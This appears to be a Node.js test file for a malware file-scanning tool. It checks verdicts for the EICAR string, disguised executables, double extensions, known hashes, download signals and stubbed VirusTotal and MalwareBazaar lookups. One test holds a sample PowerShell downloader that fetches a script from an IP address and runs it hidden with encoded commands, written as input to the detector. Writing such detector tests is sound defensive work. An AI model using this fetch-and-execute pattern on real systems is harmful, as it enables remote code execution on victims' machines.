import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { EICAR_STRING, magic, entropy, nameSignals, downloadSignals, analyzeFile } from './filerules.mjs';
import { lookupHash, inspectFile } from './filecheck.mjs';

test('EICAR test string yields Confirmed Malicious without quarantining repository', () => {
  const buf = Buffer.from(EICAR_STRING);
  const res = analyzeFile({ bytes: buf, name: 'eicar.com' });
  assert.equal(res.verdict, 'Confirmed Malicious');
  assert(res.evidence.some(e => e.finding.includes('EICAR')));
});

test('MZ executable bytes disguised with invoice.pdf extension yields High Risk', () => {
  // MZ header with dummy bytes
  const buf = Buffer.from([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
  const res = analyzeFile({ bytes: buf, name: 'invoice.pdf' });
  assert.equal(res.verdict, 'High Risk');
  assert(res.evidence.some(e => e.finding.includes('claims document/image extension')));
});

test('Double extension invoice.pdf.exe yields High Risk', () => {
  const buf = Buffer.from('console.log("hello");');
  const res = analyzeFile({ bytes: buf, name: 'invoice.pdf.exe' });
  assert.equal(res.verdict, 'High Risk');
  assert(res.evidence.some(e => e.finding.includes('Double extension')));
});

test('PNG image named photo.png yields Low Risk', () => {
  const pngHeader = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D]);
  const res = analyzeFile({ bytes: pngHeader, name: 'photo.png' });
  assert.equal(res.verdict, 'Low Risk');
  assert.equal(res.type, 'image');
});

test('Plain text readme.txt yields Low Risk', () => {
  const buf = Buffer.from('This is a completely normal documentation file.\nIt has no malicious script commands.');
  const res = analyzeFile({ bytes: buf, name: 'readme.txt' });
  assert.equal(res.verdict, 'Low Risk');
  assert.equal(res.type, 'text');
});

test('Truncated download yields Inconclusive and skips hash lookups', async () => {
  const buf = Buffer.from([0x4D, 0x5A, 0x00, 0x00]);
  const res = await inspectFile({ bytes: buf, name: 'truncated.bin', truncated: true, size: 50000000 });
  assert.equal(res.verdict, 'Inconclusive');
  assert(res.limits.some(l => l.includes('truncated')));
});

test('Hash in local signature list yields Confirmed Malicious', () => {
  const buf = Buffer.from('custom-sample-payload-bytes');
  const sha = createHash('sha256').update(buf).digest('hex');
  const known = new Set([sha]);
  const res = analyzeFile({ bytes: buf, name: 'sample.bin', known });
  assert.equal(res.verdict, 'Confirmed Malicious');
  assert(res.evidence.some(e => e.finding.includes('matched local malware hash signature')));
});

test('Script with 4 downloader patterns yields High Risk', () => {
  const scriptContent = `
    $data = [System.Convert]::FromBase64String("aGVsbG8=");
    $wc = New-Object System.Net.WebClient;
    $wc.DownloadString("http://185.0.2.10/payload.ps1");
    Invoke-Expression "Write-Host test";
    powershell.exe -windowstyle hidden -enc dGVzdA==
  `;
  const res = analyzeFile({ bytes: Buffer.from(scriptContent), name: 'downloader.ps1' });
  assert.equal(res.verdict, 'High Risk');
  assert(res.evidence.some(e => e.finding.includes('Multiple aggressive script downloader')));
});

test('downloadSignals returns fixed string for .exe URL and header', () => {
  const signals1 = downloadSignals({ 'content-type': 'application/x-msdownload' }, 'https://site.example/file');
  assert.deepEqual(signals1, ['Link delivers an executable or script download']);

  const signals2 = downloadSignals({}, 'https://site.example/installer.exe');
  assert.deepEqual(signals2, ['Link delivers an executable or script download']);

  const cleanSignals = downloadSignals({ 'content-type': 'text/html' }, 'https://site.example/index.html');
  assert.deepEqual(cleanSignals, []);
});

test('lookupHash parsing with stubbed globalThis.fetch', async () => {
  const origFetch = globalThis.fetch;
  try {
    // 1. VT 200 with 30 malicious engines
    globalThis.fetch = async () => ({
      status: 200,
      json: async () => ({
        data: { attributes: { last_analysis_stats: { malicious: 30, harmless: 40 } } }
      })
    });
    const vtRes = await lookupHash('a'.repeat(64), { VT_API_KEY: 'test-key' });
    assert.equal(vtRes.status, 'completed');
    assert.equal(vtRes.maliciousEngines, 30);

    // 2. VT 404
    globalThis.fetch = async () => ({ status: 404 });
    const vt404 = await lookupHash('b'.repeat(64), { VT_API_KEY: 'test-key' });
    assert.equal(vt404.status, 'not_found');
    assert.equal(vt404.maliciousEngines, 0);

    // 3. MalwareBazaar hash_not_found
    globalThis.fetch = async () => ({
      status: 200,
      json: async () => ({ query_status: 'hash_not_found' })
    });
    const mbRes = await lookupHash('c'.repeat(64), { ABUSECH_KEY: 'test-key' });
    assert.equal(mbRes.status, 'not_found');
    assert.equal(mbRes.malwareBazaar, 'none');
  } finally {
    globalThis.fetch = origFetch;
  }
});
